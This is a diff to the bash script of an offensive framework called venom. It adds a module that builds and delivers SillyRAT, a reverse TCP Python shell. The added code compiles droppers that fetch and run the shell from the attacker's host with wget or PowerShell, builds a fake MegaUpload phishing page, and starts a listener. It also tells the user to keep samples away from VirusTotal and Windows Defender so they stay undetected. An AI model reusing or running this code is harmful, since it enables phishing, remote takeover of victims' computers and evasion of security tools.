@@ -10208,6 +10208,229 @@ fi
 
 
 
+# ------------------------------------------
+# SillyRAT (reverse TCP python shell)
+# https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
+# ------------------------------------------
+sh_evasion6 () {
+Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+
+
+# ----------------- Dependencies Checks -----------------
+
+
+## Make Sure all dependencies are meet
+# check if mingw32 OR mingw-W64 GCC library exists
+echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
+audit=$(which $ComP) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
+   if [ "$ArCh" = "x64" ]; then
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
+      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
+   else
+      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
+      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
+      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
+   fi
+fi
+
+## Check if python3 its installed on attacker machine
+audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
+   echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
+fi
+
+## Check if 'venomconf' file exists
+if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
+   cd $IPATH/bin/SillyRAT
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
+   echo "" && pip3 install -r requirements.txt && echo ""
+   ## Write 'venomconf' file to prevent the install function from running again
+   echo "venom 'SillyRAT' configuration file" > venomconf
+   cd $IPATH
+fi
+
+
+# -------------------------------------------------------
+
+
+## Store User Inputs (module bash variable declarations)..
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe\nWithout dropper.exe the Client.py requires to be manual exec" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="666";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
+if [ -z "$SOSP" ]; then SOSP="windows";fi
+if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+if [ "$SOSP" = "Windows" ]; then
+   targetos="Windows"
+   dropextension="exe"
+   uploadpath="$rpath => (remote)"
+   lolbin="Powershell (DownloadFile)"
+   dropperpath="$IPATH/output/$Drop.$dropextension"
+elif [ "$SOSP" = "Linux" ]; then
+   targetos="Linux"
+   dropextension="NULL"
+   uploadpath="NULL"
+   lolbin="wget (DownloadFile)"
+   dropperpath="$IPATH/output/$Drop"
+else
+   lolbin="Direct Download (url)"
+   targetos="$SOSP"
+   dropextension="py"
+   uploadpath="NULL"
+   dropperpath="NULL"
+fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    TARGETOS : ($targetos distro)
+    LOLBin   : $lolbin
+    DROPPER  : $dropperpath
+    AGENT    : $IPATH/output/$Drop.py
+    UPLOADTO : $uploadpath
+!
+echo "---"
+
+
+cd $IPATH/output
+if [ "$SOSP" = "Windows" ]; then
+
+   ## BUILD DROPPER (to download/execute Client.py).
+   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+   cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
+   sed -i "s|LhOsT|$lhost|g" dropper.c
+   sed -i "s|LpOrT|$lport|g" dropper.c
+   sed -i "s|FiLNaMe|$Drop|g" dropper.c
+   sed -i "s|TempDir|$rpath|g" dropper.c
+
+   ## COMPILING C Program USING mingw32 OR mingw-W64
+   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
+   # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+   $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
+   rm $IPATH/output/dropper.c > /dev/nul 2>&1
+
+elif [ "$SOSP" = "Linux" ]; then
+
+   ## BUILD DROPPER (to download/execute Client.py)
+   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+   echo "/*" > $Drop.c
+   echo "Author: r00t-3xp10it" >> $Drop.c
+   echo "Framework: venom v1.0.17" >> $Drop.c
+   echo "gcc -fno-stack-protector -z execstack $Drop.c -o $Drop" >> $Drop.c
+   echo "*/" >> $Drop.c
+   echo "" >> $Drop.c
+   echo "#include <stdio.h>" >> $Drop.c
+   echo "#include <stdlib.h>" >> $Drop.c
+   echo "" >> $Drop.c
+   echo "int main()" >> $Drop.c
+   echo "{" >> $Drop.c
+   echo "    system(\"cd /tmp && wget http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
+   echo "    return 0;" >> $Drop.c
+   echo "}" >> $Drop.c
+
+   ## COMPILING C Program USING mingw32 OR mingw-W64
+   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
+   gcc -fno-stack-protector -z execstack $Drop.c -o $Drop
+   chmod +x $IPATH/output/$Drop > /dev/null 2>&1
+   rm $IPATH/output/$Drop.c > /dev/nul 2>&1
+
+else
+:
+fi
+
+
+cd $IPATH/bin/SillyRAT
+## Writting Client reverse tcp python shell to output
+echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
+xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
+
+
+cd $IPATH/templates/phishing
+## Building 'the Download Webpage' in HTML
+echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
+mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+
+cd $IPATH/output
+echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
+if [ "$SOSP" = "Windows" ]; then
+   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
+   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
+   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+elif [ "$SOSP" = "Linux" ]; then
+   zip $Drop.zip $Drop > /dev/nul 2>&1 # ZIP dropper.c
+   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
+   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+else
+   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell
+   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
+fi
+
+
+cd $IPATH
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
+read stupidpause
+
+
+cd $IPATH/output
+## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
+cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
+echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
+cd $IPATH
+sleep 2
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
+rm $ApAcHe/$Drop.py > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $IPATH/output/$Drop > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+rm $IPATH/output/server.py > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+cd $IPATH
+
+sh_menu
+}
+
+
+
+
 
 # ---------------------------------------------------
 # astrobaby word macro trojan payload (windows.c) OR
@@ -11988,16 +12211,6 @@ cat << !
     AGENT EXTENSION    : EXE
     AGENT PERSISTENCE  : NOT AVAILABLE
 
-    AGENT Nº6
-    ─────────
-    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
-    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
-    LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : EXE|NULL
-    AGENT EXTENSION    : PY
-    AGENT PERSISTENCE  : NOT AVAILABLE
-
-
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -13134,189 +13347,6 @@ sh_menu
 
 
 
-
-# ------------------------------------------
-# SillyRAT (reverse TCP python shell)
-# https://github.com/r00t-3xp10it/venom/tree/master/bin/SillyRAT
-# ------------------------------------------
-sh_evasion6 () {
-Colors;
-
-## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
-echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
-echo "- Please Dont test samples on Virus Total or on similar"${Reset};
-echo "- online scanners, because that will shorten the payload life."${Reset};
-echo "- And in testings also remmenber to stop the windows defender"${Reset};
-echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
-echo "---"
-sleep 2
-
-
-# ----------------- Dependencies Checks -----------------
-
-
-## Make Sure all dependencies are meet
-# check if mingw32 OR mingw-W64 GCC library exists
-echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";sleep 2
-audit=$(which $ComP) > /dev/null 2>&1
-if [ "$?" -ne "0" ]; then
-   echo "${RedF}[ERROR] GCC compiler lib not found ($ComP)${white}"
-   if [ "$ArCh" = "x64" ]; then
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
-      echo "" && sudo apt-get update && apt-get install -y mingw-w64 && echo ""
-      ComP="i686-w64-mingw32-gcc" # GCC library used to compile binary
-   else
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing GCC compiler."
-      echo "" && sudo apt-get update && apt-get install -y mingw32 && echo ""
-      ComP="i586-mingw32msvc-gcc" # GCC library used to compile binary
-   fi
-fi
-
-## Check if python3 its installed on attacker machine
-audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
-if [ "$?" -ne "0" ]; then
-   echo "${RedF}[ERROR] python3 interpreter not found${white}";sleep 2
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} python3 its required in Attacker/Target to exec Server/Client.${white}";
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package.";sleep 2
-   echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
-fi
-
-## Check if 'venomconf' file exists
-if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
-   cd $IPATH/bin/SillyRAT
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing SillyRAT requirements.";sleep 2
-   echo "" && pip3 install -r requirements.txt && echo ""
-   ## Write 'venomconf' file to prevent the install function from running again
-   echo "venom 'SillyRAT' configuration file" > venomconf
-   cd $IPATH
-fi
-
-
-# -------------------------------------------------------
-
-
-## Store User Inputs (module bash variable declarations)..
-lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe\nWithout dropper.exe the Client.py requires to be manual exec" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
-
-## Setting default values in case user have skip this ..
-if [ -z "$lhost" ]; then lhost="$IP";fi
-if [ -z "$lport" ]; then lport="666";fi
-if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$SOSP" ]; then SOSP="windows";fi
-if [ -z "$Drop" ]; then Drop="Python3Installer";fi
-if [ "$SOSP" = "Windows" ]; then
-   targetos="Windows"
-   dropextension="exe"
-   uploadpath="$rpath => (remote)"
-   dropperpath="$IPATH/output/$Drop.$dropextension"
-else
-   targetos="$SOSP"
-   dropextension="py"
-   uploadpath="NULL"
-   dropperpath="NULL"
-fi
-
-
-## Display final settings to user.
-echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
-echo ${BlueF}"---"
-cat << !
-    LPORT    : $lport
-    LHOST    : $lhost
-    TARGETOS : ($targetos distro)
-    LOLBin   : Powershell (DownloadFile)
-    DROPPER  : $dropperpath
-    AGENT    : $IPATH/output/$Drop.py
-    UPLOADTO : $uploadpath
-!
-echo "---"
-
-
-cd $IPATH/output
-if [ "$SOSP" = "Windows" ]; then
-   ## BUILD DROPPER (to download/execute Client.ps1).
-   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-   cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
-   sed -i "s|LhOsT|$lhost|g" dropper.c
-   sed -i "s|LpOrT|$lport|g" dropper.c
-   sed -i "s|FiLNaMe|$Drop|g" dropper.c
-   sed -i "s|TempDir|$rpath|g" dropper.c
-
-   ## COMPILING C Program USING mingw32 OR mingw-W64
-   echo "${BlueF}[☠]${white} Compiling dropper using GCC"${Reset};sleep 2
-   # special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
-   $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
-   rm $IPATH/output/dropper.c > /dev/nul 2>&1
-fi
-
-
-cd $IPATH/bin/SillyRAT
-## Writting Client reverse tcp python shell to output
-echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
-xterm -T "SillyRAT - Generator Mode" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
-
-
-cd $IPATH/templates/phishing
-## Building 'the Download Webpage' in HTML
-echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
-sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
-mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
-
-cd $IPATH/output
-echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
-if [ "$SOSP" = "Windows" ]; then
-   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
-   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
-   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
-else
-   zip $Drop.zip $Drop.py > /dev/nul 2>&1 # ZIP rev tcp Client shell
-   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # rev tcp Client shell ziped
-fi
-
-
-cd $IPATH
-## Print attack vector on terminal
-echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
-echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-echo "${BlueF}---"${Reset};
-echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
-read stupidpause
-
-
-cd $IPATH/output
-## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
-cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
-echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
-cd $IPATH
-sleep 2
-
-
-## Clean old files.
-echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
-rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
-rm $ApAcHe/$Drop.py > /dev/nul 2>&1
-rm $ApAcHe/Download.html > /dev/nul 2>&1
-rm $IPATH/output/dropper.c > /dev/nul 2>&1
-rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
-rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
-rm $IPATH/output/server.py > /dev/nul 2>&1
-rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
-cd $IPATH
-
-sh_menu
-}
-
-
-
-
-
 # NOT IN USE
 sh_evasion444 () {
 Colors;
@@ -13826,6 +13856,14 @@ cat << !
     AGENT EXECUTION    : python agent.py
     DETECTION RATIO    : https://goo.gl/nz8Hmr
 
+    AGENT Nº5
+    ─────────
+    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
+    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : EXE|NULL
+    AGENT EXTENSION    : PY
+    DETECTION RATIO    : https://....
 
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
@@ -13843,6 +13881,7 @@ case $choice in
 2) sh_shellcode18 ;;
 3) sh_shellcode19 ;;
 4) sh_shellcode26 ;;
+5) sh_evasion6 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_multi_menu ;;
